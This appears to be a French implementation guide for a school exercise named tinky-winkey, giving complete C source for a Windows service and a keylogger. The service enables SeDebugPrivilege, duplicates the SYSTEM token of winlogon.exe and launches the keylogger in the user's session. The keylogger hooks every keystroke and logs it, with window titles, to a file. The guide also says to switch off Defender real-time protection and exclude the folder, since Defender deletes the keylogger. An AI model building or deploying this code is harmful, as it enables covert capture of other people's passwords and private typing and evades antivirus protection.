# tinky-winkey

Windows Service & Keylogger en C pur (WinAPI). Guide d'implémentation complet.

---

## 0. Environnement

- **VM Windows 10/11** (Microsoft fournit des VMs d'évaluation gratuites).
- **Build Tools for Visual Studio** (ou VS Community) → fournit `cl.exe`, `link.exe`, `nmake.exe`.
- Ouvrir **"x64 Native Tools Command Prompt for VS"** pour avoir `cl` dans le `PATH`.
- **Defender désactivé** (sinon il supprime le keylogger) : Settings → Virus & threat protection → Manage settings → Real-time protection: Off. Ajouter aussi une exclusion du dossier repo.
- Langue : **C uniquement** (pas de C++, plus simple et plus rapide).
- Flags : `/Wall /WX` (imposés) — très strict, voir section Makefile.

---

## 1. Arborescence

```
tinky-winkey/
├── Makefile
├── README.md
├── .gitignore
├── include/
│   └── common.h
├── svc/
│   ├── main.c          # entrée CLI + StartServiceCtrlDispatcher
│   ├── scm.c           # install / start / stop / delete
│   ├── service.c       # ServiceMain + ControlHandler
│   └── impersonate.c   # SeDebug + DuplicateTokenEx winlogon + CreateProcessAsUser
└── winkey/
    ├── main.c          # mutex single-instance + SetWindowsHookEx + message loop
    ├── hook.c          # LowLevelKeyboardProc (WH_KEYBOARD_LL)
    ├── foreground.c    # détection changement fenêtre foreground
    └── logger.c        # écriture UTF-8 timestampée
```

---

## 2. APIs imposées par le sujet

| API | Où | Rôle |
|---|---|---|
| `OpenSCManager` | `svc/scm.c` | Ouvrir le handle du Service Control Manager |
| `CreateService` | `svc/scm.c` | Créer le service `tinky` |
| `OpenService` | `svc/scm.c` | Obtenir un handle vers `tinky` pour start/stop/delete |
| `StartService` | `svc/scm.c` | Démarrer le service |
| `ControlService` | `svc/scm.c` | Envoyer `SERVICE_CONTROL_STOP` |
| `CloseServiceHandle` | partout | Libérer chaque handle SCM obtenu |
| `DuplicateTokenEx` | `svc/impersonate.c` | Dupliquer le token SYSTEM de `winlogon.exe` |

**Libs à linker** : `advapi32.lib user32.lib kernel32.lib shell32.lib`.

---

## 3. `include/common.h`

```c
#ifndef COMMON_H
#define COMMON_H

#pragma warning(push, 3)
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#pragma warning(pop)

#define SVC_NAME       L"tinky"
#define SVC_DISPLAY    L"tinky"
#define WINKEY_EXE     L"winkey.exe"
#define WINKEY_MUTEX   L"Global\\tinky_winkey_mutex"
#define LOG_NAME       L"winkey.log"

#endif
```

---

## 4. Service `svc.exe`

### 4.1 `svc/main.c` — dispatch CLI + entrée service

```c
#include "common.h"

int svc_install(void);
int svc_start(void);
int svc_stop(void);
int svc_delete(void);
VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv);

int wmain(int argc, wchar_t **argv)
{
    if (argc == 2) {
        if (!lstrcmpW(argv[1], L"install")) return svc_install();
        if (!lstrcmpW(argv[1], L"start"))   return svc_start();
        if (!lstrcmpW(argv[1], L"stop"))    return svc_stop();
        if (!lstrcmpW(argv[1], L"delete"))  return svc_delete();
    }

    /* Appelé par le SCM sans arg : on entre dans le dispatcher */
    SERVICE_TABLE_ENTRYW table[] = {
        { (LPWSTR)SVC_NAME, (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { NULL, NULL }
    };
    if (!StartServiceCtrlDispatcherW(table)) {
        fwprintf(stderr, L"Usage: svc.exe [install|start|stop|delete]\n");
        return 1;
    }
    return 0;
}
```

### 4.2 `svc/scm.c` — install/start/stop/delete

```c
#include "common.h"

int svc_install(void)
{
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);

    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) { wprintf(L"OpenSCManager failed: %lu\n", GetLastError()); return 1; }

    SC_HANDLE svc = CreateServiceW(
        scm, SVC_NAME, SVC_DISPLAY,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        path,
        NULL, NULL, NULL, NULL, NULL);

    if (!svc) {
        wprintf(L"CreateService failed: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return 1;
    }

    wprintf(L"Service {%ls} installed successfully.\n", SVC_NAME);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return 0;
}

int svc_start(void)
{
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 1;
    SC_HANDLE svc = OpenServiceW(scm, SVC_NAME, SERVICE_START);
    if (!svc) { CloseServiceHandle(scm); return 1; }

    if (!StartServiceW(svc, 0, NULL)) {
        wprintf(L"StartService failed: %lu\n", GetLastError());
        CloseServiceHandle(svc); CloseServiceHandle(scm); return 1;
    }
    wprintf(L"Service {%ls} started successfully.\n", SVC_NAME);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return 0;
}

int svc_stop(void)
{
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 1;
    SC_HANDLE svc = OpenServiceW(scm, SVC_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 1; }

    SERVICE_STATUS st;
    if (!ControlService(svc, SERVICE_CONTROL_STOP, &st)) {
        wprintf(L"ControlService failed: %lu\n", GetLastError());
        CloseServiceHandle(svc); CloseServiceHandle(scm); return 1;
    }
    wprintf(L"Service {%ls} stopped successfully.\n", SVC_NAME);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return 0;
}

int svc_delete(void)
{
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 1;
    SC_HANDLE svc = OpenServiceW(scm, SVC_NAME, DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 1; }

    SERVICE_STATUS st;
    ControlService(svc, SERVICE_CONTROL_STOP, &st); /* tente stop, ignore erreur */

    if (!DeleteService(svc)) {
        wprintf(L"DeleteService failed: %lu\n", GetLastError());
        CloseServiceHandle(svc); CloseServiceHandle(scm); return 1;
    }
    wprintf(L"Service {%ls} deleted successfully.\n", SVC_NAME);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return 0;
}
```

### 4.3 `svc/service.c` — ServiceMain + handler

```c
#include "common.h"

static SERVICE_STATUS         g_status;
static SERVICE_STATUS_HANDLE  g_statusHandle;
static HANDLE                 g_stopEvent;
static PROCESS_INFORMATION    g_winkey;

int launch_winkey_as_system(PROCESS_INFORMATION *out);

static void set_state(DWORD state, DWORD exitCode)
{
    g_status.dwCurrentState  = state;
    g_status.dwWin32ExitCode = exitCode;
    g_status.dwControlsAccepted = (state == SERVICE_START_PENDING) ? 0 : SERVICE_ACCEPT_STOP;
    SetServiceStatus(g_statusHandle, &g_status);
}

static DWORD WINAPI ControlHandler(DWORD ctrl, DWORD evt, LPVOID data, LPVOID ctx)
{
    (void)evt; (void)data; (void)ctx;
    if (ctrl == SERVICE_CONTROL_STOP) {
        set_state(SERVICE_STOP_PENDING, 0);
        if (g_winkey.hProcess) {
            TerminateProcess(g_winkey.hProcess, 0);
            WaitForSingleObject(g_winkey.hProcess, 2000);
            CloseHandle(g_winkey.hProcess);
            CloseHandle(g_winkey.hThread);
            ZeroMemory(&g_winkey, sizeof(g_winkey));
        }
        SetEvent(g_stopEvent);
        return NO_ERROR;
    }
    if (ctrl == SERVICE_CONTROL_INTERROGATE) return NO_ERROR;
    return ERROR_CALL_NOT_IMPLEMENTED;
}

VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
{
    (void)argc; (void)argv;
    ZeroMemory(&g_status, sizeof(g_status));
    g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;

    g_statusHandle = RegisterServiceCtrlHandlerExW(SVC_NAME, ControlHandler, NULL);
    if (!g_statusHandle) return;

    set_state(SERVICE_START_PENDING, 0);
    g_stopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    if (launch_winkey_as_system(&g_winkey) != 0) {
        set_state(SERVICE_STOPPED, 1);
        return;
    }

    set_state(SERVICE_RUNNING, 0);
    WaitForSingleObject(g_stopEvent, INFINITE);

    CloseHandle(g_stopEvent);
    set_state(SERVICE_STOPPED, 0);
}
```

### 4.4 `svc/impersonate.c` — `DuplicateTokenEx` + `CreateProcessAsUser`

```c
#include "common.h"
#include <tlhelp32.h>

static BOOL enable_debug_privilege(void)
{
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    BOOL ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(tok);
    return ok;
}

static DWORD find_winlogon_pid(void)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, L"winlogon.exe")) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int launch_winkey_as_system(PROCESS_INFORMATION *out)
{
    enable_debug_privilege();

    DWORD pid = find_winlogon_pid();
    if (!pid) return 1;

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return 1;

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY |
                                  TOKEN_IMPERSONATE | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                          &hTok)) {
        CloseHandle(hProc); return 1;
    }

    HANDLE hDup = NULL;
    /* ← fonction imposée */
    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &hDup)) {
        CloseHandle(hTok); CloseHandle(hProc); return 1;
    }

    /* Chemin absolu du winkey.exe = même dossier que svc.exe */
    wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
    wchar_t *slash = wcsrchr(path, L'\\');
    if (slash) *(slash + 1) = 0;
    wcscat_s(path, MAX_PATH, WINKEY_EXE);

    STARTUPINFOW si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"winsta0\\default";

    BOOL ok = CreateProcessAsUserW(hDup, path, NULL, NULL, NULL, FALSE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, out);

    CloseHandle(hDup); CloseHandle(hTok); CloseHandle(hProc);
    return ok ? 0 : 1;
}
```

---

## 5. Keylogger `winkey.exe`

### 5.1 `winkey/main.c`

```c
#include "common.h"

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

int wmain(void)
{
    HANDLE mtx = CreateMutexW(NULL, TRUE, WINKEY_MUTEX);
    if (!mtx || GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                   GetModuleHandleW(NULL), 0);
    if (!hook) { ReleaseMutex(mtx); CloseHandle(mtx); return 1; }

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnhookWindowsHookEx(hook);
    ReleaseMutex(mtx); CloseHandle(mtx);
    return 0;
}
```

### 5.2 `winkey/foreground.c`

```c
#include "common.h"

static HWND g_lastHwnd = NULL;

void logger_write_header(const wchar_t *title);

HKL foreground_update_and_layout(void)
{
    HWND fg = GetForegroundWindow();
    DWORD tid = GetWindowThreadProcessId(fg, NULL);
    HKL layout = GetKeyboardLayout(tid);

    if (fg != g_lastHwnd) {
        wchar_t title[512] = {0};
        GetWindowTextW(fg, title, 512);
        logger_write_header(title);
        g_lastHwnd = fg;
    }
    return layout;
}
```

### 5.3 `winkey/hook.c`

```c
#include "common.h"

HKL foreground_update_and_layout(void);
void logger_write_raw(const wchar_t *s);

static const wchar_t *named_key(DWORD vk)
{
    switch (vk) {
        case VK_RETURN:   return L"\n";
        case VK_TAB:      return L"\t";
        case VK_BACK:     return L"[BS]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return L"Shift";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return L"Ctrl";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return L"Alt";
        case VK_LWIN: case VK_RWIN: return L"Win";
        case VK_CAPITAL:  return L"[CAPS]";
        case VK_SPACE:    return L" ";
        case VK_LEFT:     return L"[LEFT]";
        case VK_RIGHT:    return L"[RIGHT]";
        case VK_UP:       return L"[UP]";
        case VK_DOWN:     return L"[DOWN]";
        case VK_DELETE:   return L"[DEL]";
        case VK_HOME:     return L"[HOME]";
        case VK_END:      return L"[END]";
        default: return NULL;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lParam;
        HKL layout = foreground_update_and_layout();

        const wchar_t *named = named_key(k->vkCode);
        if (named) {
            logger_write_raw(named);
        } else {
            BYTE state[256] = {0};
            GetKeyboardState(state);
            wchar_t buf[8] = {0};
            int n = ToUnicodeEx(k->vkCode, k->scanCode, state, buf, 7, 0, layout);
            if (n > 0) { buf[n] = 0; logger_write_raw(buf); }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

### 5.4 `winkey/logger.c`

```c
#include "common.h"

static CRITICAL_SECTION g_cs;
static BOOL             g_init = FALSE;

static void log_path(wchar_t *out, size_t cap)
{
    GetModuleFileNameW(NULL, out, (DWORD)cap);
    wchar_t *slash = wcsrchr(out, L'\\');
    if (slash) *(slash + 1) = 0;
    wcscat_s(out, cap, LOG_NAME);
}

static void write_utf8(const wchar_t *s)
{
    if (!g_init) { InitializeCriticalSection(&g_cs); g_init = TRUE; }
    EnterCriticalSection(&g_cs);

    wchar_t path[MAX_PATH]; log_path(path, MAX_PATH);
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { LeaveCriticalSection(&g_cs); return; }

    int need = WideCharToMultiByte(CP_UTF8, 0, s, -1, NULL, 0, NULL, NULL);
    if (need > 1) {
        char *utf8 = (char*)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)need);
        if (utf8) {
            WideCharToMultiByte(CP_UTF8, 0, s, -1, utf8, need, NULL, NULL);
            DWORD written;
            WriteFile(h, utf8, (DWORD)(need - 1), &written, NULL);
            HeapFree(GetProcessHeap(), 0, utf8);
        }
    }
    CloseHandle(h);
    LeaveCriticalSection(&g_cs);
}

void logger_write_raw(const wchar_t *s) { write_utf8(s); }

void logger_write_header(const wchar_t *title)
{
    SYSTEMTIME t; GetLocalTime(&t);
    wchar_t buf[768];
    _snwprintf_s(buf, 768, _TRUNCATE,
        L"\n[%02u.%02u.%04u %02u:%02u:%02u] - %ls\n",
        t.wDay, t.wMonth, t.wYear, t.wHour, t.wMinute, t.wSecond, title);
    write_utf8(buf);
}
```

---

## 6. `Makefile` (NMAKE)

```make
# NMAKE — appelle avec: nmake  |  nmake clean  |  nmake re

CC      = cl
# /Wall est imposé mais bruyant dans les headers Windows.
# On masque les warnings SDK courants (alignement, padding, non utilisés).
CFLAGS  = /nologo /Wall /WX /Zi /DUNICODE /D_UNICODE /Iinclude \
          /wd4820 /wd4668 /wd5045 /wd4710 /wd4711 /wd4255 /wd4996
LDFLAGS = /nologo /DEBUG
LIBS    = advapi32.lib user32.lib kernel32.lib shell32.lib

SVC_OBJS    = svc\main.obj svc\scm.obj svc\service.obj svc\impersonate.obj
WINKEY_OBJS = winkey\main.obj winkey\hook.obj winkey\foreground.obj winkey\logger.obj

all: svc.exe winkey.exe

svc.exe: $(SVC_OBJS)
	link $(LDFLAGS) /OUT:$@ $(SVC_OBJS) $(LIBS)

winkey.exe: $(WINKEY_OBJS)
	link $(LDFLAGS) /OUT:$@ $(WINKEY_OBJS) $(LIBS)

.c.obj:
	$(CC) $(CFLAGS) /c $< /Fo$@

clean:
	-del /Q svc\*.obj winkey\*.obj *.pdb *.ilk 2>nul

fclean: clean
	-del /Q svc.exe winkey.exe winkey.log 2>nul

re: fclean all
```

Warnings masqués (inévitables avec `/Wall` + headers SDK) : `C4820` padding, `C4668` macro non définie, `C5045` Spectre, `C4710/C4711` inline, `C4255` `()` vs `(void)`, `C4996` deprecated CRT.

---

## 7. `.gitignore`

```
*.obj
*.exe
*.pdb
*.ilk
*.log
.vs/
x64/
Debug/
Release/
```

---

## 8. Compilation & tests

Ouvrir **x64 Native Tools Command Prompt for VS** en **Administrateur** (obligatoire pour install/start/stop/delete un service).

```cmd
cd C:\path\to\tinky-winkey
nmake re
```

### Test complet (copie de l'exemple du sujet)

```cmd
svc.exe install
sc queryex tinky                         :: STATE: 1 STOPPED

svc.exe start
sc queryex tinky                         :: STATE: 4 RUNNING
tasklist | findstr winkey                :: winkey.exe ... visible

:: Tape dans Notepad, Chrome, etc.
type winkey.log

svc.exe stop
tasklist | findstr winkey                :: rien

svc.exe delete
sc queryex tinky                         :: introuvable
```

### Checklist de validation

- [ ] `nmake re` sans warning.
- [ ] `svc.exe install` → visible dans `services.msc`.
- [ ] `svc.exe start` → `winkey.exe` apparaît dans `tasklist`.
- [ ] `winkey.log` se remplit pendant la frappe.
- [ ] Chaque changement de fenêtre foreground = nouveau header `[timestamp] - <titre>`.
- [ ] Disposition FR : `é à è ç` correctement loggés (grâce à `ToUnicodeEx` + `GetKeyboardLayout(tid)`).
- [ ] `Shift`, `Ctrl`, `\n`, `\t` loggés en toutes lettres comme dans l'exemple du sujet.
- [ ] `svc.exe stop` → `winkey.exe` disparaît de `tasklist`.
- [ ] `svc.exe delete` → service introuvable.
- [ ] Lancer `winkey.exe` 2× manuellement → le 2e exit immédiat (mutex).
- [ ] Cycle complet `install → start → stop → delete → install → start` fonctionne à nouveau.

---

## 9. Pièges classiques

1. **Lancer cmd en admin** sinon `OpenSCManager(SC_MANAGER_CREATE_SERVICE)` fail avec `ERROR_ACCESS_DENIED` (5).
2. **Defender** : il va détecter et supprimer `winkey.exe`. Désactiver + exclure le dossier.
3. **`/Wall`** casse sur les headers Windows si on ne masque pas les warnings SDK.
4. **Hook LL sans message loop** : Windows désinstalle le hook après ~5 s. Toujours boucler `GetMessageW`.
5. **Service coincé en `STOP_PENDING`** : oublier `SetServiceStatus(STOPPED)` à la fin. Forcer avec `sc queryex` + `taskkill /F`.
6. **`CreateProcessAsUserW`** : oublier `lpDesktop = L"winsta0\\default"` → le process démarre mais n'a pas de desktop et les hooks UI ne reçoivent rien.
7. **Session 0 isolation** : un service ne voit pas les inputs de la session user. C'est pour ça qu'on lance `winkey.exe` via `CreateProcessAsUserW` avec le token de `winlogon.exe` de la session interactive — sinon le hook ne capture rien.
8. **`ToUnicodeEx` et dead keys** : en azerty FR, `^` puis `e` → `ê`. Passer `0` en flag et utiliser le même `state`/`layout` à chaque appel.
9. **UTF-8 vs UTF-16** : la log est en UTF-8, bien convertir avec `WideCharToMultiByte(CP_UTF8, ...)`.
10. **Chemin relatif de `winkey.exe`** : depuis le service, `CreateProcessAsUserW` n'hérite pas du cwd. Toujours passer un chemin absolu (celui du svc.exe + `winkey.exe`).

---

## 10. Ordre de travail recommandé

1. Créer l'arborescence + `common.h` + `.gitignore` + `Makefile`.
2. Écrire `winkey/` d'abord (plus simple, testable en standalone : lancer `winkey.exe` manuellement, vérifier la log).
3. Valider keylogger + locale + foreground avant de s'attaquer au service.
4. Écrire `svc/scm.c` (install/start/stop/delete) — testable sans ServiceMain (install, puis démarrer via `sc start tinky` pour vérifier que le binaire est bien enregistré).
5. Écrire `svc/service.c` (ServiceMain squelette qui lance juste `winkey.exe` via `CreateProcessW` d'abord, sans impersonation).
6. Ajouter `svc/impersonate.c` en dernier (DuplicateTokenEx + CreateProcessAsUser).
7. Test end-to-end.
8. Nettoyer les warnings.
9. Commit + push.
